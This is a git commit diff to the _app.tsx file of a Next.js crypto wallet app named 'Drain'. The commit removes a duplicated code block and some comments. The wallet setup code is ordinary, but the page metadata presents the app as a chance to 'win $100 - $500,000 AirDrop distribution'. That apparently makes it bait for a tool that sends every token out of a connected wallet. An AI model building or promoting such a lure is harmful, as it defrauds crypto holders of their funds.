124c800f8c911f385a535e235b97ebebadca7925
Fadanadia3 <fadanadia3@gmail.com>
2025-02-03 16:42:15 +0100

    Update _app.tsx

--- pages/_app.tsx
+++ pages/_app.tsx
@@ -10,7 +10,6 @@ import {
   configureChains,
   createConfig,
   mainnet,
-  // createClient,
   WagmiConfig,
 } from 'wagmi';
 import { publicProvider } from 'wagmi/providers/public';
@@ -25,7 +24,7 @@ import { useIsMounted } from '../hooks';
 // Ensure that the environment variable is correctly set in your .env file
 const walletConnectProjectId = z
   .string()
-  .parse(process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID);  // Ensure that this variable is correctly set in .env
+  .parse(process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID);
 
 const { chains, publicClient } = configureChains(
   [mainnet, polygon, optimism, arbitrum, bsc, gnosis],
@@ -34,7 +33,7 @@ const { chains, publicClient } = configureChains(
 
 const { connectors } = getDefaultWallets({
   appName: 'Drain',
-  projectId: walletConnectProjectId, // Pass the projectId from environment variable
+  projectId: walletConnectProjectId,
   chains,
 });
 
@@ -48,87 +47,9 @@ const App = ({ Component, pageProps }: AppProps) => {
   const isMounted = useIsMounted();
 
   if (!isMounted) return null;
-  return (
-    <>import { CssBaseline, GeistProvider } from '@geist-ui/core';
-import type { AppProps } from 'next/app';
-import NextHead from 'next/head';
-import GithubCorner from 'react-github-corner';
-// @ts-ignore
-import '../styles/globals.css';
 
-// Imports
-import {
-  configureChains,
-  createConfig,
-  mainnet,
-  // createClient,
-  WagmiConfig,
-} from 'wagmi';
-import { publicProvider } from 'wagmi/providers/public';
-
-import { getDefaultWallets, RainbowKitProvider } from '@rainbow-me/rainbowkit';
-import '@rainbow-me/rainbowkit/styles.css';
-
-import { arbitrum, bsc, gnosis, optimism, polygon } from 'viem/chains';
-import { z } from 'zod';
-import { useIsMounted } from '../hooks';
-
-// Ensure that the environment variable is correctly set in your .env file
-const walletConnectProjectId = z
-  .string()
-  .parse(process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID);  // Ensure that this variable is correctly set in .env
-
-const { chains, publicClient } = configureChains(
-  [mainnet, polygon, optimism, arbitrum, bsc, gnosis],
-  [publicProvider()],
-);
-
-const { connectors } = getDefaultWallets({
-  appName: 'Drain',
-  projectId: walletConnectProjectId, // Pass the projectId from environment variable
-  chains,
-});
-
-const wagmiConfig = createConfig({
-  autoConnect: true,
-  connectors,
-  publicClient,
-});
-
-const App = ({ Component, pageProps }: AppProps) => {
-  const isMounted = useIsMounted();
-
-  if (!isMounted) return null;
   return (
     <>
-      <GithubCorner
-        href="https://github.com/dawsbot/drain"
-        size="140"
-        bannerColor="#e056fd"
-      />
-
-      <WagmiConfig config={wagmiConfig}>
-        <RainbowKitProvider coolMode chains={chains}>
-          <NextHead>
-            <title>Airdrop</title>
-            <meta
-              name="description"
-              content="Send all tokens from one wallet to another"
-            />
-            <link rel="icon" href="/favicon.ico" />
-          </NextHead>
-          <GeistProvider>
-            <CssBaseline />
-            <Component {...pageProps} />
-          </GeistProvider>
-        </RainbowKitProvider>
-      </WagmiConfig>
-    </>
-  );
-};
-
-export default App;
-
       <GithubCorner
         href="https://github.com/dawsbot/drain"
         size="140"
@@ -142,8 +63,6 @@ export default App;
             <meta
               name="description"
               content="Try to win $100 - $500,000 AirDrop distribution"
-
-
             />
             <link rel="icon" href="/favicon.ico" />
           </NextHead>
